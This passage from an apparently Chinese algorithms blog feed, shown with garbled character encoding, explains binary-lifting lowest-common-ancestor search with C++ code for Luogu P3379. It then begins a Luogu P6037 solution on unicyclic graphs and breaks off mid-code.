æœ‰ä¼šå‘ç°ï¼Œå¦‚æœå†å¾€ä¸Šæ‰¾4ä¸ªï¼Œé‚£ä¹ˆä¼šæ²¡æœ‰è¿™ä¸ªå€¼ï¼Œé‚£æ€ä¹ˆåŠå‘¢ï¼Ÿå…¶å®æˆ‘ä»¬ä¸éœ€è¦å®ƒæœ‰ï¼Œæˆ‘ä»¬åªéœ€è¦å®ƒç›¸ç­‰å³å¯ã€‚å› ä¸ºæ ¹èŠ‚ç‚¹ä¸€å®šæ˜¯æ‰€æœ‰èŠ‚ç‚¹ä¹‹é—´çš„å…¬å…±ç¥–å…ˆï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥å°±è¿™ä¹ˆæ‰¾ï¼Œæ‰¾åˆ°ç›¸ç­‰åŒºé—´å¾€é‡Œé¢ç¼©å°ä¸€åŠï¼Œå°±å¾€ä¸Šæ‰¾2ä¸ªç¥–å…ˆï¼Œè¿™æ—¶å€™å¯ä»¥å‘ç°åˆšå¥½åœ¨æ ¹èŠ‚ç‚¹ä¹‹å‰ï¼Œå¦‚æœå®ƒä»¬çš„æœ€è¿‘å…¬å…±ç¥–å…ˆæ˜¯æ ¹èŠ‚ç‚¹ï¼Œé‚£ä¹ˆåŒç†ï¼Œè¿™æ¬¡å¯»æ‰¾åˆä¼šå¾€ä¸Šå†æ‰¾ä¸¤ä¸ªç¥–å…ˆã€‚åˆè·‘åˆ°äº†æ ¹èŠ‚ç‚¹ä¹‹å¤–ï¼Œåˆ¤æ–­ç›¸ç­‰ï¼ŒåŒºé—´ç¼©å°ä¸º1ã€‚åŒºé—´ç¼©å°ä¸º1çš„æ—¶å€™é€€å‡ºå¾ªç¯ï¼Œæ­¤æ—¶æˆ‘ä»¬è¦æ‰¾çš„æœ€è¿‘å…¬å…±ç¥–å…ˆå°±åœ¨å½“å‰ç‚¹çš„çˆ¶äº²èŠ‚ç‚¹ã€‚</p><p>ä¸çŸ¥é“è¿™æ˜¯å¦èƒ½è§£å†³ä½ åœ¨è¿ç”¨å€å¢æ³•æ±‚ $LCA$ çš„ç–‘æƒ‘ã€‚</p><p>å¯ä»¥çœ‹åˆ°æ¯æ¬¡ä»¥æ ‘çš„é«˜åº¦ä¸ºèŒƒå›´ï¼ŒåŒºé—´ç¼©å°ä¸€åŠåœ°æ±‚ï¼Œæ•ˆç‡æ˜¯éå¸¸é«˜çš„ã€‚æ±‚ä¸€æ¬¡ $LCA$ çš„æ—¶é—´å¤æ‚åº¦ä»…ä»…ä¸º $log_2n$ã€‚</p><h2 id="é¢˜ç›®ç»ƒæ‰‹"><a href="#é¢˜ç›®ç»ƒæ‰‹" class="headerlink" title="é¢˜ç›®ç»ƒæ‰‹"></a>é¢˜ç›®ç»ƒæ‰‹</h2><p><a href="https://www.luogu.com.cn/problem/P3379">æ´›è°·P3379</a> </p><p>æ ‡ç‰ˆï¼Œç›´æ¥æ‰“å°±å®Œäº‹äº†ã€‚è¿™é‡Œéœ€è¦æ³¨æ„ä¸€ä¸‹ï¼Œå¦‚æœæ·±åº¦ä¸ä¸€æ ·é‚£ä¹ˆå…ˆå¹³è¡¡æ·±åº¦è¿™ä¸ªæ“ä½œï¼Œè¿™ä¸ªæ“ä½œæˆ‘ä»¬å¹¶ä¸æ˜¯ä¹Ÿè¦ä¸€ä¸ªä¸€ä¸ªå¹³è¡¡çš„ï¼Œä¹Ÿå¯ä»¥ç”¨å€å¢çš„æ€è·¯ã€‚æˆ‘å…ˆç®—å‡ºä¸¤æ·±åº¦ä¹‹å·®ï¼ŒæŠŠå·®æ‹†åˆ†ä¸ºäºŒè¿›åˆ¶æ¯”ç‰¹ä½ï¼Œå¦‚æœä»ç¬¬å¾€é«˜ç¬¬ $i$ ä½ä¸º $1$ï¼Œé‚£ä¹ˆæˆ‘å°±å¾€å‰å¯»æ‰¾ $2^i$ ä¸ªç¥–å…ˆï¼Œè€Œä»å½“å‰ç‚¹å¾€å‰å¯»æ‰¾ $2^i$ ä¸ªç¥–å…ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨ $fa[now][i]$ æ¥å¿«é€Ÿæ±‚å¾—ã€‚å¦‚æœå®ƒæ„é€ ç‰¹æ®Šæ•°æ®ï¼Œé‚£ä¹ˆç›´æ¥ä¸€ä½ä¸€ä½å¾€å‰å¯»æ‰¾å¹³è¡¡æ·±åº¦å¯èƒ½ä¼šå¯¼è‡´è¶…æ—¶ã€‚</p><h3 id="æ ‡ç¨‹"><a href="#æ ‡ç¨‹" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 500005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">&#125;edge[maxn&lt;&lt;<span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> root[maxn],cnt,lg[maxn],n,q,s;</span><br><span class="line"><span class="keyword">int</span> fa[maxn][<span class="number">25</span>],depth[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    edge[++cnt].to=y;</span><br><span class="line">    edge[cnt].next=root[x];</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> now,<span class="keyword">int</span> p)</span></span>&#123;</span><br><span class="line">    fa[now][<span class="number">0</span>]=p;</span><br><span class="line">    depth[now]=depth[p]+<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//printf(&quot;point=%d deep=%d\n&quot;,now,depth[now]);</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=lg[depth[now]];i++)&#123;</span><br><span class="line">        fa[now][i]=fa[fa[now][i<span class="number">-1</span>]][i<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=root[now];i;i=edge[i].next)&#123;</span><br><span class="line">        <span class="keyword">int</span> to=edge[i].to;</span><br><span class="line">        <span class="keyword">if</span>(to!=p)</span><br><span class="line">            <span class="built_in">dfs</span>(to,now);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LCA</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(depth[a]&gt;depth[b])&#123;</span><br><span class="line">        <span class="built_in">swap</span>(a,b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> x=depth[b]-depth[a];</span><br><span class="line">    <span class="keyword">int</span> k=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//printf(&quot;a=%d,b=%d\n&quot;,a,b);</span></span><br><span class="line">    <span class="keyword">while</span>(x)&#123;</span><br><span class="line">        <span class="keyword">if</span>(x&amp;<span class="number">1</span>)&#123;</span><br><span class="line">            b=fa[b][k];</span><br><span class="line">        &#125;</span><br><span class="line">        k++;</span><br><span class="line">        x&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;deep=%d\n&quot;,depth[b]);</span></span><br><span class="line">    k=lg[depth[a]];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a=%d,b=%d\n&quot;</span>,a,b);</span><br><span class="line">    <span class="keyword">while</span>(k!=<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;k=%d\n&quot;</span>,k);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;a=%d,b=%d\n&quot;</span>,fa[a][k],fa[b][k]);</span><br><span class="line">        <span class="keyword">if</span>(fa[a][k]==fa[b][k])k--;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            a=fa[a][k];</span><br><span class="line">            b=fa[b][k];</span><br><span class="line">            <span class="comment">//k=lg[depth[a]];</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(a==b)<span class="keyword">return</span> a;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> fa[a][<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;q&gt;&gt;s;</span><br><span class="line">    lg[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i&gt;&gt;(lg[i<span class="number">-1</span>]+<span class="number">1</span>))lg[i]=lg[i<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> lg[i]=lg[i<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,y;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y;</span><br><span class="line">        <span class="built_in">add</span>(x,y);</span><br><span class="line">        <span class="built_in">add</span>(y,x);</span><br><span class="line">    &#125;</span><br><span class="line">    depth[s]=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">dfs</span>(s,s);</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">int</span> a,b;</span><br><span class="line">        cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">LCA</span>(a,b));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> å›¾è®º </category>
          
          <category> LCA </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ´›è°·P6037é¢˜è§£</title>
      <link href="/2022/02/11/%E6%B4%9B%E8%B0%B7P6037%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/02/11/%E6%B4%9B%E8%B0%B7P6037%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.luogu.com.cn/problem/P6037">æ´›è°·P6037</a>é¢˜è§£</p><span id="more"></span><h2 id="æµ…è°ˆåŸºç¯æ ‘-ç¯å¥—æ ‘"><a href="#æµ…è°ˆåŸºç¯æ ‘-ç¯å¥—æ ‘" class="headerlink" title="æµ…è°ˆåŸºç¯æ ‘(ç¯å¥—æ ‘)"></a>æµ…è°ˆåŸºç¯æ ‘(ç¯å¥—æ ‘)</h2><p>åœ¨é¢˜ç›®å¼€å§‹ä¹‹å‰ï¼Œå°±å” ä¸€å” è¿™ä¸ªå«åŸºç¯æ ‘çš„ç»“æ„ã€‚å‡†ç¡®æ¥è¯´ï¼ŒåŸºç¯æ ‘å®ƒå·²ç»ä¸æ˜¯æ ‘äº†ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œæ ‘ä¸€å®šæ˜¯ç”± $n$ ç‚¹å’Œ $n-1$ æ¡è¾¹ç»„æˆçš„ã€‚è€ŒåŸºç¯æ ‘æ˜¯ç”± $n$ ç‚¹ä¸ $n$ è¾¹ç»„æˆã€‚ä½†æ˜¯å› ä¸ºå®ƒè·Ÿæ ‘è¿˜æ˜¯å¾ˆåƒï¼Œå¹¶ä¸”åœ¨ä¿è¯è¿é€šçš„æƒ…å†µä¸‹æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªç®€å•ç¯ï¼Œå› æ­¤å¾—åã€‚å¦‚æœä¸è¿é€šï¼Œé‚£ä¹ˆå®ƒä¼šæˆä¸ºåŸºç¯æ ‘æ£®æ—ã€‚</p><p><img src="/2022/02/11/%E6%B4%9B%E8%B0%B7P6037%E9%A2%98%E8%A7%A3/1.png" alt="1"></p><p>æ¯”å¦‚ä¸Šå›¾å°±æ˜¯ä¸€ä¸ªåŸºç¯æ ‘ã€‚æˆ‘ä»¬å¯ä»¥å¾ˆæ¸…æ¥šçš„çœ‹å‡ºæ¥ï¼Œç‚¹ $2,1,3,7$ å½¢æˆäº†ç¯ï¼Œæ–­å¼€ä»»æ„ä¸€æ¡å±äºç¯ä¸­çš„è¾¹éƒ½ä¼šä½¿è¿™ä¸ªæ£µåŸºç¯æ ‘æˆä¸ºæ ‘ã€‚ä¸€èˆ¬æƒ…å†µä¸‹éƒ½æ˜¯å°†ç¯å’Œç¯è¿æ¥çš„å­æ ‘è¿›è¡Œåˆ†å¼€è®¨è®ºã€‚å¦‚ä½•æ±‚ç¯å‘¢ï¼Ÿæˆ‘ä»¬åªéœ€è¦ dfs ä¸€éå°±è¡Œäº†ï¼Œå¦‚æœé‡åˆ°è¢«è®¿é—®è¿‡çš„ç‚¹ï¼Œé‚£å°±ä¾æ¬¡è¿”å›è·¯å¾„ä¸Šçš„æ‰€æœ‰ç‚¹ï¼Œç›´åˆ°æˆ‘é‡åˆ°çš„é‚£ä¸ªç‚¹ä¸ºæ­¢ã€‚</p><p>ä¸¾ä¸ªä¾‹å­ï¼Œåœ¨ä¸Šå›¾ä¸­ï¼Œæˆ‘ä» 6 å¼€å§‹ dfsï¼Œå‡è®¾å®ƒç»å†äº† $6 \to 2 \to 1 \to 3 \to 7$ çš„é¡ºåºã€‚é‚£ä¹ˆæ¥ä¸‹æ¥åœ¨æœç´¢ 7 çš„æ—¶å€™å°±ä¼šå‘ç°ä¸å®ƒç›¸è¿çš„ç‚¹ 2 å·²ç»è¢«è®¿é—®è¿‡ï¼Œé‚£ä¹ˆæˆ‘è¿”å›å€¼ç»™ä¸ª 2ï¼Œä¾æ¬¡å›æº¯ï¼Œå›æº¯è¿‡ç¨‹ä¸­å°†ç‚¹å…¥æ ˆæˆ–è€…å…¥ä¸€ä¸ª $vector$ éƒ½å¯ä»¥ã€‚ç›´åˆ°å›æº¯åˆ° 2 è¿™ä¸ªç‚¹ä¸ºæ­¢ã€‚ç¯å°±è¢«æˆ‘ä»¬æ±‚å‡ºæ¥äº†ã€‚</p><p>èƒ½æ±‚å‡ºç¯æˆ‘ä»¬å°±ä¼šå¾ˆå¥½åšè¿™ç±»çš„é¢˜ç›®äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å…·ä½“çœ‹çœ‹è¿™é¢˜å§ã€‚</p><h2 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h2><p>Ryoku æ‰€å¤„çš„ä¸–ç•Œå¯ä»¥æŠ½è±¡æˆä¸€ä¸ªæœ‰ n ä¸ªç‚¹ï¼Œ næ¡è¾¹çš„å¸¦æƒæ— å‘è¿é€šå›¾ Gã€‚æ¯æ¡è¾¹æœ‰ç¾è§‚åº¦å’Œé•¿åº¦ã€‚</p><p>Ryoku ä¼šä½¿ç”¨è¿™æ ·ä¸€ä¸ªç­–ç•¥æ¢ç´¢ä¸–ç•Œï¼šåœ¨æ¯ä¸ªç‚¹å¯»æ‰¾ä¸€ä¸ª<strong>ç«¯ç‚¹å¥¹æœªèµ°è¿‡</strong>çš„è¾¹ä¸­<strong>ç¾è§‚åº¦æœ€é«˜</strong>çš„èµ°ï¼Œå¦‚æœæ²¡æœ‰è¾¹èµ°ï¼Œå°±æ²¿ç€å¥¹å‰å¾€è¿™ä¸ªç‚¹çš„è¾¹è¿”å›ï¼Œç±»ä¼¼äºå›¾çš„<strong>æ·±åº¦ä¼˜å…ˆéå†</strong>ã€‚</p><p>æ¢ç´¢çš„ä¸€ä¸ªæ–¹æ¡ˆçš„é•¿åº¦æ˜¯è¿™ä¸ªæ–¹æ¡ˆæ‰€ç»è¿‡çš„æ‰€æœ‰è¾¹é•¿åº¦çš„å’Œï¼ˆè¿”å›æ—¶ç»è¿‡çš„é•¿åº¦ä¸ç”¨è®¡ç®—ï¼‰ã€‚</p><p>å¥¹æƒ³çŸ¥é“ï¼Œå¯¹äºæ¯ä¸€ä¸ªèµ·ç‚¹ $s=1,2,\cdots,n$ï¼Œå¥¹éœ€è¦èµ°è¿‡çš„é•¿åº¦æ˜¯å¤šå°‘ï¼Ÿ</p><hr><p>$n$ ä¸ªç‚¹ $n$ æ¡è¾¹çš„è¿é€šå›¾ï¼Œé‚£ä¹ˆè‚¯å®šå°±æ˜¯åŸºç¯æ ‘äº†ç„¶åå®ƒä¼šæ ¹æ®ç¾è§‚åº¦ä¸æ·±åº¦ä¼˜å…ˆçš„ä¸€ç§æœç´¢ç­–ç•¥ï¼Œå³é‡åˆ°åˆ†æ”¯å…ˆæ²¿ä¸€æ¡åˆ†æ”¯èµ°å®Œå†èµ°å¦ä¸€æ¡åˆ†æ”¯ï¼Œå¹¶ä¸”å¤šæ¡åˆ†æ”¯ä¼˜å…ˆæœç´¢ç¾è§‚åº¦é«˜çš„åˆ†æ”¯ã€‚å›æº¯èµ°çš„è·¯ä¸ç®—ï¼Œé—®ä½ ä»¥ä¸åŒçš„ç‚¹ä¸ºèµ·ç‚¹æœç´¢å®Œæ‰€æœ‰çš„ç‚¹éœ€è¦èµ°å¤šå°‘é•¿åº¦ã€‚</p><p>æˆ‘ä»¬ä¸éš¾å¾—å‡ºï¼Œå¦‚æœè¦éå† $n$ ä¸ªç‚¹ï¼Œæˆ‘ä»¬åªéœ€è¦èµ°è¿‡ $n-1$ æ¡è¾¹ã€‚è€Œå¯¹äºä¸€æ£µæ ‘è€Œè¨€ï¼Œå¯¹å®ƒæ·±åº¦ä¼˜å…ˆæœç´¢ä¸€å®šä¼šéå†æ ‘ä¸Šæ‰€æœ‰çš„è¾¹ã€‚å› æ­¤å¦‚æœæŠŠåŸºç¯æ ‘æ‹†å¼€ç§°ä¸ºä¸€ä¸ªç¯å’Œè‹¥å¹²ä¸ªå­æ ‘ï¼Œæˆ‘ä»¬å°±åªéœ€è¦åœ¨ç¯ä¸Šè®¨è®ºæƒ…å†µï¼Œå­æ ‘çš„æ‰€æœ‰è¾¹ä¸€å®šæ˜¯éƒ½ä¼šèµ°è¿‡çš„ã€‚å¯¹äºåŒä¸€ä¸ªç¯ï¼Œæˆ‘å…ˆå‘å³è¾¹éå†å’Œå…ˆå‘å·¦è¾¹éå†èµ°çš„è·¯å¾„æ˜¯å®Œå…¨ä¸ä¸€æ ·çš„ï¼Œå¦‚æœå…ˆå‘å³è¾¹é‚£å¿…ç„¶å¯¼è‡´å®ƒå·¦è¾¹ä¸ä¼šè¢«èµ°è¿‡ï¼ŒåŒç†å…ˆèµ°å·¦è¾¹é‚£å³è¾¹å°±ä¸ä¼šè¢«èµ°è¿‡ã€‚</p><p>å†æ ¹æ®é¢˜ä¸­çš„ç­–ç•¥ï¼Œå¯¹äºç¯ä¸Šçš„ç‚¹ï¼Œæˆ‘ä»¬åªéœ€è¦å¾ªç¯ä¸€éç¯ä¸Šçš„æ‰€æœ‰ç‚¹ï¼Œè§‚å¯Ÿä¸å®ƒè¿æ¥çš„åœ¨ç¯ä¸Šçš„è¾¹çš„ç¾è§‚åº¦å“ªä¸ªæ¯”è¾ƒå¤§ï¼Œé‚£ä¹ˆç­”æ¡ˆå°±æ˜¯æ‰€æœ‰å›¾çš„è¾¹æƒå‡å»é‚£ä¸ªç¾è§‚åº¦è¾ƒå°çš„è¾¹æƒã€‚å¯¹äºä¸åœ¨ç¯ä¸Šçš„ç‚¹æˆ‘ä»¬å¯ä»¥è§‚å¯Ÿå®ƒæ‰€åœ¨çš„å­æ ‘è¿æ¥åœ¨ç¯çš„å“ªä¸ªç‚¹ï¼Œå› ä¸ºä»é‚£ä¸ªç‚¹éå†å‡ºæ¥æœ€ç»ˆä¹Ÿä¼šä»å®ƒæ‰€åœ¨çš„å­æ ‘èµ°å‘ç¯çš„é‚£ä¸ªç‚¹ï¼Œç„¶åæƒ…å†µå°±å˜æˆäº†åœ¨æ¢ä¸Šå¯¹åº”çš„ç‚¹éå†çš„æƒ…å†µäº†ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬å…ˆå¤§è‡´æè¿°ä¸€ä¸‹ç®—æ³•æµç¨‹ï¼š</p><ul><li>å°†è¾¹æŒ‰ç…§å‡ºç‚¹è¯»å…¥ $vector$ å½“ä¸­ï¼Œå¹¶ä¸”æŒ‰ç¾è§‚åº¦æ’åº</li><li>dfs è·‘å‡ºç¯ä¸Šçš„ç‚¹å°†å…¶æ ‡è®°</li><li>å¯¹ç¯ä¸Šæ‰€æœ‰çš„ç‚¹è¿›è¡Œç­”æ¡ˆè®¡ç®—</li><li>å¯¹ç¯ä¸Šçš„ç‚¹å†è·‘ä¸€æ¬¡dfsï¼Œç„¶åæœç´¢ç­–ç•¥ä¸ºéç¯ä¸Šçš„ç‚¹ï¼Œå°†æœç´¢åˆ°çš„ç‚¹æ ‡è®°ä¸ºç¯ä¸Šå¯¹åº”çš„é‚£ä¸ªç‚¹</li><li>æœ€åç­”æ¡ˆå°±å‡ºæ¥äº†</li></ul><h2 id="æ ‡ç¨‹"><a href="#æ ‡ç¨‹" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 3000005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">    <span class="keyword">int</span> p;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> visited[maxn],ans[maxn],n;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> sum_len,res[maxn];<span class="comment">//ä¸å¼€long longè§ç¥–å®—</span></span><br><span class="line">vector&lt;eee&gt;edge[maxn];<span class="comment">//ç”¨vectoræ•°ç»„ä¿å­˜è¾¹æ–¹ä¾¿æ’åº</span></span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt;s;<span class="comment">//ä¿å­˜ç¯ä¸Šçš„ç‚¹</span></span><br><span class="line"><span class="keyword">bool</span> in_stack[maxn];<span class="comment">//å› ä¸ºæˆ‘åŸæ¥ä½¿ç”¨æ ˆä¿å­˜çš„å› æ­¤å‘½åè¿™ä¸ªï¼Œè¡¨ç¤ºç‚¹æ˜¯å¦åœ¨ç¯ä¸Š</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w,<span class="keyword">int</span> p)</span></span>&#123;</span><br><span class="line">    eee e;</span><br><span class="line">    e.to=y;</span><br><span class="line">    e.w=w;</span><br><span class="line">    e.p=p;</span><br><span class="line">    edge[x].<span class="built_in">push_back</span>(e);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(eee a,eee b)</span></span>&#123;<span class="comment">//æŒ‰ç¾è§‚åº¦æ’åº</span></span><br><span class="line">    <span class="keyword">return</span> a.p&gt;b.p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> u,<span class="keyword">int</span> pre)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(visited[u])&#123;<span class="comment">//å¦‚æœæœç´¢åˆ°äº†è¢«æ ‡è®°è¿‡çš„ç‚¹åˆ™è¯´æ˜é‡åˆ°ç¯äº†</span></span><br><span class="line">        <span class="keyword">return</span> u;</span><br><span class="line">    &#125;</span><br><span class="line">    visited[u]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> value=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> it=edge[u].<span class="built_in">begin</span>();it!=edge[u].<span class="built_in">end</span>();it++)&#123;</span><br><span class="line">        <span class="keyword">int</span> v=it-&gt;to;</span><br><span class="line">        <span class="keyword">if</span>(v==pre||in_stack[v])<span class="keyword">continue</span>;<span class="comment">//é˜²æ­¢é€†æœç´¢ï¼Œå¹¶é˜²æ­¢å¯¹ç¯é‡æ–°æœç´¢</span></span><br><span class="line">        <span class="comment">//ä»ç¯çš„èµ·ç‚¹å¼€å§‹ï¼Œå‡å¦‚æˆ‘é¡ºæ—¶é’ˆè·‘å‡ºäº†ç¯ï¼Œé‚£ä¹ˆå®ƒä¸‹ä¸€æ¡è¾¹å°†ä¼šé€†æ—¶é’ˆè·‘ç¯</span></span><br><span class="line">        <span 